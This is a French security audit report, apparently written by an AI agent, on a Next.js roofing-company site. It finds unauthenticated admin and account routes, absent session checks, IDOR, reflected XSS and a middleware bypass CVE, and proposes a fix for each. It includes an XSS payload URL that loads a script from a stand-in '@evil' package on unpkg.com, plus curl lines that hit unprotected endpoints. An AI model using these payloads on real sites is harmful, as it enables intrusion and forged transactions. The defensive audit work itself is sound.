# Audit de sécurité applicative — Zlobodan Couverture

**Date** : 25 juillet 2026
**Périmètre** : `src/` (Next.js 14.2.15 App Router, Drizzle ORM / PostgreSQL), configuration racine, dépendances de production.
**Méthode** : revue de code manuelle exhaustive + `npm audit`. Aucune exécution dynamique (pas de serveur lancé, pas de base de données atteignable).
**Statut** : audit seul. **Aucune modification n'a été apportée au code.**

---

## 0. Synthèse exécutive

Le projet possède les *briques* d'une bonne posture de sécurité (bcrypt coût 12, hachage des jetons de session, magic bytes, purge EXIF, moteur `can()`, audit log, Turnstile, TOTP). Le problème n'est pas leur qualité, c'est qu'**elles ne sont branchées nulle part**.

Trois constats structurants :

1. **Il n'existe aucun point du code où une session est vérifiée.** `getSessionTokenFromCookie()` est appelé une seule fois, dans `/api/auth/logout`. Aucune requête ne lit la table `sessions` pour valider un jeton, son expiration ou sa révocation. L'authentification est en écriture seule : on crée des sessions que personne ne lit.
2. **Par conséquent, `/admin/*`, `/mon-compte/*` et toutes les routes API métier sont accessibles sans authentification**, en accès direct comme par appel API.
3. **Le moteur d'autorisation `can()` n'est jamais appelé en production.** Il est testé, documenté dans `SECURITY.md`, et mort.

À cela s'ajoutent une XSS réfléchie exploitable sur `/api/pdf/*`, une CSP qui autorise précisément ce qu'il faut pour l'exploiter, et une version de Next.js affectée par CVE-2025-29927 (contournement d'autorisation dans le middleware).

**Niveau de protection actuel, chiffré** (0 = absent, 10 = état de l'art) :

| Couche | Note | Commentaire |
| :--- | :---: | :--- |
| Injection SQL | **7/10** | Aucun SQL brut dans le code. Note plafonnée par une CVE Drizzle, l'absence de RLS, de compte à privilèges réduits et de `statement_timeout`. |
| Contrôle d'accès (authn/authz) | **0/10** | Aucune vérification. Le back-office est public. |
| XSS / injection de code | **3/10** | React échappe par défaut, mais `/api/pdf/*` génère du HTML par concaténation et la CSP autorise `unsafe-eval` + un CDN tiers. |
| Anti-DoS applicatif | **1/10** | Rate limiter écrit mais jamais importé, et en mémoire locale. Aucun plafond de pagination, de corps de requête ou de timeout. |
| Robustesse de l'authentification | **4/10** | Bonnes primitives, mais 2FA contournable, verrouillage utilisable comme arme de DoS, CAPTCHA neutralisable par défaut de configuration. |
| Chaîne d'approvisionnement | **2/10** | 1 vulnérabilité critique + 2 hautes non corrigées, scripts tiers chargés depuis unpkg.com sans SRI, aucun contrôle en CI. |
| Détection / supervision | **0/10** | Aucune journalisation centralisée, aucune alerte, aucun `security.txt`, aucun `report-uri`. |

**Ce qui reste exposé même après correction complète du code** : tout ce qui relève de l'infrastructure (DDoS volumétrique, exposition de l'IP d'origine, TLS, isolation réseau de la base, gestion des secrets). Le code ne peut pas s'en occuper — voir §4 et le futur runbook.

---

## 1. Critique

### C1 — `/admin/*` accessible sans authentification
**Fichier** : [src/app/admin/layout.tsx:20](src/app/admin/layout.tsx#L20) (et `page.tsx`, `devis/page.tsx`, `factures/page.tsx`, `audit/page.tsx`)
**Scénario** : `curl -s https://zlobodan-couverture.be/admin/factures`. Le layout ne fait aucune vérification de session ni de rôle ; le middleware ne protège que les en-têtes. On obtient l'interface complète du back-office : dashboard, gestion des devis, facturation, audit log. Le lien « Opérateur : Admin Staff #01 » est purement décoratif.
**Impact aujourd'hui** : les pages affichent des données de démonstration codées en dur, donc la fuite immédiate porte sur la structure métier, les libellés internes, la numérotation des factures et des identités plausibles (« M. Jean Peeters, Avenue Louise 14, 1050 Ixelles »). **Impact dès la première requête base branchée** : compromission totale du fichier clients.
**Correctif** : garde serveur dans un module `lib/security/guards.ts` — `requireRole(["staff","admin"])` appelé en tête du layout `/admin` et de chaque route API d'administration, avec redirection 302 vers `/connexion` et journalisation de la tentative. Le contrôle doit vivre dans le composant serveur, **pas** dans le middleware (cf. C7).

### C2 — `/mon-compte/*` accessible sans authentification
**Fichier** : [src/app/mon-compte/layout.tsx:21](src/app/mon-compte/layout.tsx#L21)
**Scénario** : accès direct à `/mon-compte/factures` sans cookie. L'email « jean.peeters@email.be » est affiché en dur ligne 107, ce qui confirme qu'aucune identité de session n'est résolue.
**Correctif** : `requireAuth()` dans le layout, résolution de l'utilisateur réel depuis la session, et suppression de toute donnée client codée en dur.

### C3 — Routes PDF : ni authentification, ni contrôle d'appartenance, ni validation
**Fichiers** : [src/app/api/pdf/invoice/[id]/route.ts:4](src/app/api/pdf/invoice/%5Bid%5D/route.ts#L4), [src/app/api/pdf/quote/[id]/route.ts:4](src/app/api/pdf/quote/%5Bid%5D/route.ts#L4)
**Scénario** : `GET /api/pdf/invoice/FACT-2026-0005` sans cookie retourne un document. Aucun `can(user, "download", "invoice", …)`, aucune validation du format de `params.id`. C'est le patron exact d'un IDOR : dès que ces routes liront la base, l'énumération séquentielle (`FACT-2026-0001`, `0002`, …) exposera la facturation de toute la clientèle.
**Correctif** : `requireAuth()` + résolution de la facture en base par identifiant **UUID validé par Zod** + `can()` sur le propriétaire réel. Ne jamais accepter un numéro de document lisible comme clé d'accès.

### C4 — XSS réfléchie sur `/api/pdf/*` via `params.id`
**Fichiers** : [src/lib/services/pdfService.ts:19](src/lib/services/pdfService.ts#L19), [:26](src/lib/services/pdfService.ts#L26), [:55](src/lib/services/pdfService.ts#L55) — alimentés par `params.id` en [quote/route.ts:8](src/app/api/pdf/quote/%5Bid%5D/route.ts#L8)
**Scénario concret** :
```
GET /api/pdf/quote/%3Cscript%20src%3D%22https%3A%2F%2Funpkg.com%2F@evil%2Fx%22%3E%3C%2Fscript%3E
```
Next.js décode le paramètre de route, `generateServerPdfHtml` l'interpole sans échappement dans `<title>` et `<h2>`, et la réponse est servie en `Content-Type: text/html` sur l'origine de l'application. La CSP de [middleware.ts:9](src/middleware.ts#L9) autorise `script-src 'self' 'unsafe-eval' https://unpkg.com` : **le script tiers passe**. Le contexte d'exécution est l'origine du site — le cookie de session est `httpOnly`, ce qui limite le vol direct, mais l'attaquant obtient un pivot complet (actions authentifiées côté navigateur, phishing pixel-perfect sur un document contractuel, exfiltration du DOM).
**Correctif** : deux verrous indépendants. (1) Échappement contextuel obligatoire — fonction `escapeHtml()` / `escapeAttr()` dans `lib/security/encoding.ts`, appliquée à **toutes** les interpolations de `pdfService.ts`, y compris `designation`, `clientName`, `clientAddress`. (2) Ne jamais laisser une entrée utilisateur atteindre le générateur : `params.id` validé en UUID, document rechargé depuis la base, seules les valeurs issues de la base sont rendues. Voir aussi H1 sur la CSP.

### C5 — Signature de devis falsifiable : `/api/client/devis/[id]/accept` non authentifiée
**Fichier** : [src/app/api/client/devis/[id]/accept/route.ts:5](src/app/api/client/devis/%5Bid%5D/accept/route.ts#L5) (idem `refuse`)
**Scénario** : `curl -X POST https://…/api/client/devis/DEV-2026-0012/accept` sans aucune identité. La route écrit dans l'audit log une acceptation horodatée avec empreinte d'IP, présentée comme une signature électronique. Un tiers peut donc (a) accepter à la place d'un client un devis à 15 052 €, (b) refuser un devis pour saboter une affaire, (c) polluer l'audit log avec des `targetId` arbitraires puisque `params.id` n'est ni validé ni vérifié contre la base.
**Correctif** : `requireAuth()`, validation UUID du devis, chargement du devis, `can(user, "accept", "quote", quote)`, vérification que le statut permet la transition, écriture transactionnelle statut + audit. Rate limit strict.

### C6 — Aucune validation de session nulle part
**Fichiers** : [src/lib/auth/session.ts:42](src/lib/auth/session.ts#L42), [src/lib/services/authService.ts:181](src/lib/services/authService.ts#L181)
**Scénario** : la session est insérée en base (`tokenHash`, `expiresAt`, `revokedAt`) puis plus jamais relue. Il n'existe aucune fonction `getCurrentUser()`. Conséquence directe : `expiresAt` n'est jamais appliqué, `revokedAt` n'est jamais appliqué — **la déconnexion ne déconnecte rien** côté serveur, elle efface seulement un cookie. Un jeton copié avant déconnexion resterait valide indéfiniment si un contrôle existait.
**Correctif** : `lib/security/session-guard.ts` exposant `getCurrentUser()` — lecture du cookie, `hashToken`, jointure `sessions × users`, rejet si `revokedAt != null` ou `expiresAt < now()` ou `users.deletedAt != null`. C'est la dépendance de C1, C2, C3, C5. À traiter en premier.

### C7 — Next.js 14.2.15 : contournement d'autorisation dans le middleware (CVE-2025-29927)
**Fichier** : [package.json:16](package.json#L16)
**Scénario** : `GHSA-f82v-jwr5-mffw` permet de neutraliser l'exécution du middleware via l'en-tête `x-middleware-subrequest`. `npm audit` remonte au total **1 vulnérabilité critique et 2 hautes** sur les dépendances de production, dont plusieurs SSRF, empoisonnements de cache et DoS.
**Conséquence de conception** : toute logique d'autorisation placée dans `src/middleware.ts` serait contournable. C'est pourquoi les gardes de C1/C2 doivent être des vérifications serveur dans les layouts et les handlers, le middleware ne servant que de filet secondaire.
**Correctif** : montée de version de Next.js (14.2.15 → dernière 14.x LTS corrigée au minimum ; l'audit propose 16.2.11, changement majeur à évaluer), montée de `drizzle-orm` (cf. E7), puis `npm audit --omit=dev --audit-level=high` bloquant en CI.

---

## 2. Élevée

### H1 — CSP permissive : `unsafe-eval`, `unsafe-inline`, CDN tiers, pas de nonce, pas de report-uri
**Fichier** : [src/middleware.ts:9](src/middleware.ts#L9)
**Scénario** : `script-src` autorise `'unsafe-eval'` et `https://unpkg.com`. C'est exactement ce qui rend C4 exploitable : un attaquant n'a pas besoin d'injecter du code inline, il lui suffit de pointer un `<script src>` vers un domaine autorisé. `style-src` contient `'unsafe-inline'`, ce qui ouvre l'exfiltration par sélecteurs CSS. Aucun `report-uri`/`report-to` : une violation ne serait jamais détectée. `SECURITY.md:31` affirme le contraire.
**Correctif** : nonce par requête généré dans le middleware et propagé aux `<script>` de l'application ; suppression de `unsafe-eval` et `unsafe-inline` ; auto-hébergement de Leaflet (cf. H2) pour retirer `unpkg.com` de la liste blanche ; ajout de `report-uri /api/security/csp-report` avec un collecteur limité en débit.

### H2 — Scripts tiers chargés depuis unpkg.com sans SRI
**Fichier** : [src/components/home/LeafletMap.tsx:19](src/components/home/LeafletMap.tsx#L19), [:27](src/components/home/LeafletMap.tsx#L27)
**Scénario** : le composant injecte dynamiquement `leaflet.js` et `leaflet.css` depuis unpkg.com sans attribut `integrity` ni `crossorigin`. Une compromission d'unpkg (ou du paquet publié) donne l'exécution de JavaScript arbitraire sur la page d'accueil de tous les visiteurs. `unpkg` sert la dernière version publiée d'une plage, sans garantie d'immuabilité.
**Correctif** : auto-héberger Leaflet (`npm i leaflet`, import local, CSS bundlé). C'est la seule option qui supprime à la fois le risque d'approvisionnement et l'entrée `unpkg.com` de la CSP. À défaut, SRI + `crossorigin="anonymous"` + version épinglée.

### H3 — Rate limiting inexistant en pratique, et non partagé
**Fichier** : [src/lib/security/rateLimiter.ts:6](src/lib/security/rateLimiter.ts#L6)
**Scénario** : `checkRateLimit` n'est importé par aucun fichier (vérifié par recherche exhaustive). `/api/auth/login`, `/api/auth/register`, `/api/devis` et les routes PDF acceptent un débit illimité. De plus le stockage est un `Map` en mémoire du processus : sur Vercel, en conteneurs répliqués ou après un redémarrage, chaque instance a son propre compteur — la limite se divise par le nombre d'instances et se réinitialise à chaque déploiement.
**Correctif** : réécriture sur un stockage partagé (Upstash Redis), algorithme à fenêtre glissante, seuils par IP + par compte + global, réponses `429` avec `Retry-After` et backoff exponentiel. Branchement effectif sur toutes les routes API via un helper `withRateLimit()`.

### H4 — Le verrouillage anti-bruteforce est une arme de déni de service
**Fichier** : [src/lib/services/authService.ts:132](src/lib/services/authService.ts#L132)
**Scénario** : le compteur `failedLoginAttempts` et `lockedUntil` sont portés par le **compte seul**. Un attaquant envoie 5 mots de passe erronés sur `admin@zlobodan-couverture.be` toutes les 15 minutes et maintient l'administrateur hors de son back-office indéfiniment, sans jamais avoir besoin de connaître un mot de passe. Coût de l'attaque : quelques requêtes par heure.
**Correctif** : verrouillage sur le couple **(IP, compte)**, avec temporisation croissante plutôt que blocage sec, et palier global par compte réservé aux volumes anormaux multi-IP (accompagné d'un email d'alerte, jamais d'un blocage total).

### H5 — 2FA obligatoire pour admin/staff : contournable
**Fichier** : [src/lib/services/authService.ts:156](src/lib/services/authService.ts#L156)
```ts
if (user.role === "admin" || user.role === "staff" || user.totpEnabled === 1) {
  if (!user.totpSecret) {
    // Prompt 2FA setup required for staff/admin   ← ne fait rien
  } else { … }
}
```
**Scénario** : un administrateur dont `totpSecret` est `NULL` — c'est-à-dire tout compte créé et jamais configuré — se connecte avec le seul mot de passe. La branche censée imposer la configuration est un commentaire. `SECURITY.md:40` affirme que le TOTP est « obligatoire pour les rôles staff et admin » : c'est faux.
**Correctif** : si le rôle exige le TOTP et que `totpSecret` est absent, refuser la session complète et n'émettre qu'une session d'enrôlement à portée restreinte (`scope: "totp-setup"`), utilisable uniquement sur la route de configuration.

### H6 — Contrôle CSRF sauté quand l'en-tête `Origin` est absent
**Fichier** : [src/middleware.ts:31](src/middleware.ts#L31)
**Scénario** : `if (origin && host)` — sans `Origin`, aucun contrôle n'est effectué et la requête passe. Or `Origin` est omis par de nombreux clients non-navigateurs et, historiquement, par certaines soumissions de formulaire. Combiné à C5, une page tierce peut tenter d'accepter un devis. La déconnexion est elle-même un `POST` de formulaire simple ([mon-compte/layout.tsx:110](src/app/mon-compte/layout.tsx#L110)), donc déclenchable en CSRF.
**Correctif** : politique de refus par défaut — absence d'`Origin` **et** de `Sec-Fetch-Site` ⇒ rejet 403 sur toute mutation. Ajout d'un jeton CSRF double-soumission pour les formulaires HTML classiques. Rappel : ce contrôle vit dans le middleware, donc reste sujet à C7 tant que Next.js n'est pas à jour.

### H7 — `/api/devis` : endpoint public sans validation, sans limite, avec fuite en journal
**Fichier** : [src/app/api/devis/route.ts:6](src/app/api/devis/route.ts#L6)
**Scénarios cumulés** :
- Aucun schéma Zod (contredit `SECURITY.md:21`). Les champs sont lus en `as string` — un cast TypeScript, qui ne valide rien à l'exécution et vaut `null` si le champ est absent.
- Aucun rate limit, aucun Turnstile : un script envoie 10 000 demandes de devis. Le honeypot ligne 9 arrête les robots naïfs, rien d'autre.
- [Ligne 25-29](src/app/api/devis/route.ts#L25) : nom, email, téléphone et description sont écrits en clair dans la sortie standard. Ce sont des données personnelles (RGPD) déversées dans les journaux d'hébergement. Un `\n` dans `description` permet en outre de forger de fausses lignes de journal.
- [Ligne 38](src/app/api/devis/route.ts#L38) : la réponse renvoie les champs reçus tels quels.
- Le commentaire ligne 31 annonce un envoi d'email : dès qu'il sera branché, l'endpoint devient un relais d'amplification pour harceler un tiers.
**Correctif** : schéma Zod strict (longueurs maximales, format du code postal belge, `z.string().email()`), Turnstile invisible, rate limit par IP et par adresse email, taille de corps plafonnée, journalisation structurée sans données personnelles (identifiant de demande uniquement), suppression de l'écho `received`.

### H8 — Secrets à valeurs par défaut permissives dans le code
**Fichiers** : [src/lib/auth/turnstile.ts:2](src/lib/auth/turnstile.ts#L2), [src/lib/auth/session.ts:16](src/lib/auth/session.ts#L16), [src/db/client.ts:5](src/db/client.ts#L5)
**Scénario le plus grave** : `turnstile.ts:2` retombe sur `1x0000000000000000000000000000000AA`, la clé de test Cloudflare qui **valide systématiquement n'importe quel jeton**. Si `TURNSTILE_SECRET_KEY` est absent de l'environnement de production — oubli de configuration, variable mal nommée, nouveau conteneur — la protection anti-bruteforce de H4/C6 devient un contrôle qui répond toujours « oui », **sans aucun message d'erreur**. `session.ts:16` retombe sur un sel d'anonymisation d'IP public, ce qui rend les empreintes d'IP de l'audit log réversibles par dictionnaire (l'espace IPv4 se force en quelques minutes).
**Correctif** : validation de l'environnement au démarrage (`lib/security/env.ts` avec Zod) qui **échoue le démarrage** si un secret est absent en production. Aucune valeur de repli pour un secret. Jamais.

---

## 3. Moyenne

| Réf | Fichier | Faiblesse et scénario | Correctif |
| :--- | :--- | :--- | :--- |
| M1 | [src/db/client.ts:8](src/db/client.ts#L8) | Pool de 10 connexions, aucun `statement_timeout`, `connect_timeout` ni `idle_timeout`. Dix requêtes lentes simultanées épuisent le pool et gèlent l'application. | `statement_timeout: 5000`, timeouts de connexion, pool dimensionné. Rôles PostgreSQL séparés (applicatif restreint, lecture seule, migration) et RLS sur toutes les tables. |
| M2 | [src/lib/security/uploadService.ts:10](src/lib/security/uploadService.ts#L10) | `fs.mkdirSync` s'exécute **à l'import du module**, donc pendant le build et sur tout système de fichiers en lecture seule (serverless). Le service n'est appelé nulle part — le wizard n'envoie pas les photos. `sharp` sans `limitInputPixels` accepte une bombe de décompression. Aucune limite sur le nombre de fichiers. | Création paresseuse du répertoire, `sharp(buf, { limitInputPixels: 25e6 })`, plafond du nombre et du poids cumulé, traitement en file d'attente hors requête HTTP. |
| M3 | [src/lib/security/magicBytes.ts:17](src/lib/security/magicBytes.ts#L17) | La détection WebP compare les octets 8-11 à `57 41 56 45` = `"WAVE"`, la signature d'un fichier **audio WAV**. Un vrai WebP (`57 45 42 50` = `"WEBP"`) est donc **rejeté**, et un WAV est accepté comme image. Le contrôle de type est inversé sur ce format. | Corriger en `0x57 0x45 0x42 0x50`, ajouter un test unitaire par format avec un échantillon réel. |
| M4 | [src/app/api/auth/register/route.ts:28](src/app/api/auth/register/route.ts#L28) + [authService.ts:45](src/lib/services/authService.ts#L45) | `error.message` est renvoyé brut. « Un compte existe déjà avec cette adresse email » permet **l'énumération des comptes**, alors que le login applique soigneusement un message générique. Incohérence exploitable pour cartographier la clientèle. | Réponse identique quel que soit le cas (« Si cette adresse n'est pas déjà utilisée, un email de vérification a été envoyé »), catalogue d'erreurs sûres côté serveur, journalisation du détail réel. |
| M5 | [src/lib/auth/session.ts:22](src/lib/auth/session.ts#L22) | Cookie sans préfixe `__Host-`, `SameSite=Lax`, durée fixe de 7 jours pour **tous** les rôles y compris admin. Aucune ré-authentification avant action sensible. | Préfixe `__Host-`, `SameSite=Strict` sur le périmètre authentifié, session admin courte (30 min inactif / 8 h absolu), ré-authentification avant facturation, suppression de client et export. |
| M6 | [login/route.ts:10](src/app/api/auth/login/route.ts#L10), [register/route.ts:10](src/app/api/auth/register/route.ts#L10), accept, refuse | `x-forwarded-for` est lu tel quel et arbitrairement falsifiable. Il alimente l'audit log, le hachage d'IP et alimenterait tout futur rate limit — qu'un attaquant contournerait en faisant varier l'en-tête. | Extraction d'IP de confiance : `CF-Connecting-IP` uniquement, et uniquement si la connexion provient d'une plage Cloudflare (cf. runbook §pare-feu). |
| M7 | Transversal | Aucune journalisation centralisée, aucune alerte, aucun collecteur CSP, aucun `/.well-known/security.txt`, aucune supervision d'erreurs. Une exploitation réussie passerait totalement inaperçue. | Section 6 du cahier des charges à implémenter intégralement. |
| M8 | [next.config.js:2](next.config.js#L2) | `poweredByHeader` non désactivé : `X-Powered-By: Next.js` est renvoyé sur chaque réponse et oriente le choix des exploits. | `poweredByHeader: false`, `productionBrowserSourceMaps: false` explicite. |
| M9 | [src/lib/services/auditService.ts:34](src/lib/services/auditService.ts#L34) | Les erreurs d'écriture de l'audit sont avalées dans un `console.error`. Un attaquant qui fait échouer l'insertion (dépassement de taille sur `diff`, par exemple) efface sa trace **sans qu'aucune alerte ne se déclenche**. Le caractère « append-only » revendiqué (`SECURITY.md:44`) n'est imposé par aucune contrainte SQL. | Alerte sur échec d'écriture d'audit, plafond de taille sur `diff`, et au niveau base : `REVOKE UPDATE, DELETE ON audit_log` pour le rôle applicatif + déclencheur de refus. |

---

## 4. Faible

| Réf | Fichier | Faiblesse | Correctif |
| :--- | :--- | :--- | :--- |
| F1 | [src/lib/auth/permissions.ts:63](src/lib/auth/permissions.ts#L63) | `const resourceOwnerId = resourceObject.ownerId \|\| resourceObject.userId;` — si les deux sont absents ou `null`, la condition ligne 64 est fausse et **l'accès est accordé**. Comportement « fail-open » sur une ressource orpheline ou un objet partiellement chargé. | Inverser la logique : exiger un propriétaire identifié, refuser en son absence. |
| F2 | [scripts/run-tests.js:33](scripts/run-tests.js#L33) | Le test d'isolation **réimplémente** `can()` au lieu de l'importer. Il valide une fonction fictive de 1 ligne, pas le code de production — et passerait au vert même si `can()` était supprimé. Par ailleurs `src/__tests__/*.test.ts` utilisent `describe`/`test` alors qu'aucun runner (Jest/Vitest) n'est déclaré dans `package.json` : ces tests ne s'exécutent jamais. | Installer Vitest, importer les vraies fonctions, brancher sur la CI. |
| F3 | [src/lib/auth/password.ts:36](src/lib/auth/password.ts#L36) | Repli permissif si l'API HIBP est injoignable. Choix défendable pour la disponibilité, mais silencieux. | Conserver le comportement, ajouter une journalisation et un compteur d'alerte. |
| F4 | [.eslintrc.json:1](.eslintrc.json#L1) | Seule règle active : `max-lines`. Rien ne bloque `eval`, `dangerouslySetInnerHTML`, le SQL brut ou `child_process`. | Règles `no-restricted-syntax`/`no-restricted-properties` bloquantes + `eslint-plugin-security`. |
| F5 | [src/components/seo/JsonLdSchema.tsx:118](src/components/seo/JsonLdSchema.tsx#L118) | `dangerouslySetInnerHTML` avec `JSON.stringify`, qui **n'échappe pas** `</script>`. Données statiques aujourd'hui — donc risque réel faible — mais la moindre donnée dynamique (nom de ville, avis client) qui y transiterait deviendrait une XSS. Contredit `SECURITY.md:22`. | Sérialiseur qui échappe `<`, `>` et `&` en séquences unicode, ou `<script type="application/ld+json">` alimenté via nonce. |
| F6 | [SECURITY.md](SECURITY.md) | Le document affirme des protections **qui n'existent pas** : isolation client « en aucun cas » (l.11), Zod sur « 100 % des API » (l.21), absence de `dangerouslySetInnerHTML` (l.22), CSP « sans unsafe-inline » (l.31), jetons de reset à 15 min (l.41 — aucun code de réinitialisation n'existe dans le projet). Une documentation de sécurité fausse est un risque en soi : elle empêche l'organisation de savoir ce qu'elle doit corriger. | Réécriture complète en fin de chantier, avec une section « risques résiduels assumés » honnête. |
| F7 | [src/app/robots.ts:9](src/app/robots.ts#L9) | `/admin` n'est pas en `disallow` : le back-office est indexable. Le `sitemap` pointe vers `.fr` alors que le site est `.be` (incohérence de configuration). | Ajouter `/admin` et `/mon-compte` au `disallow` — mesure d'hygiène, **pas** un contrôle d'accès. |

---

## 5. Plan de correction proposé (ordre d'exécution)

L'ordre compte : les couches 2 à 7 n'ont pas de valeur tant que la couche 1 n'existe pas.

1. **Fondations d'accès** — C6 puis C1, C2, C3, C5, F1. Création de `lib/security/session-guard.ts` et `lib/security/guards.ts`.
2. **Injection & encodage** — C4, H1, H2, F5, M3, plus l'outillage ESLint (F4) et `lib/db/raw-queries.ts` comme point de passage unique documenté.
3. **Chaîne d'approvisionnement** — C7, H8, M8 : montée de version, validation d'environnement bloquante, en-têtes.
4. **Anti-abus** — H3, H4, H7, M1, M2 : rate limiting Redis, verrouillage par (IP, compte), Turnstile, plafonds et timeouts.
5. **Authentification avancée** — H5, H6, M4, M5, M6 : 2FA réellement imposé, CSRF par défaut refusé, sessions admin courtes, IP de confiance.
6. **Détection** — M7, M9 : journalisation, alertes, collecteur CSP, `security.txt`, honeypots.
7. **Preuve** — suite de tests d'injection, de contrôle d'accès horizontal et vertical, de rate limiting multi-instances, d'en-têtes, et vérification qu'aucun secret ne figure dans le bundle client. Correction de F2 au passage.

Puis livraison de `SECURITY.md` (F6), du runbook d'infrastructure et de la liste des mesures hors périmètre.

**Contrainte respectée** : tout le code ajouté ira dans de nouveaux modules sous `lib/security/`, `lib/db/` et `lib/validations/`. Aucun fichier existant ne dépassera 400 lignes.

---

## 6. Hors de portée du code — à traiter en infrastructure

Ces points ne peuvent pas être corrigés dans le dépôt et resteront exposés quelle que soit la qualité du code livré :

- **DDoS volumétrique (L3/L4)** — nécessite Cloudflare ou équivalent en amont, proxy activé.
- **Exposition de l'IP d'origine** — sans pare-feu limitant le trafic HTTP aux plages du CDN, toute la protection amont se contourne en attaquant l'IP directement.
- **TLS** — version, suites de chiffrement, HSTS preload, renouvellement automatique.
- **Isolation réseau de la base** — accès privé, chiffrement au repos, rôles PostgreSQL, RLS (le code peut déclarer les politiques, leur application dépend du déploiement).
- **Gestion et rotation des secrets** — coffre dédié.
- **Sauvegardes et restauration** — non vérifiables depuis le code.

Ces éléments feront l'objet du runbook demandé en livrable 3.

---

**Fin de l'audit.** En attente de validation avant toute modification du code.
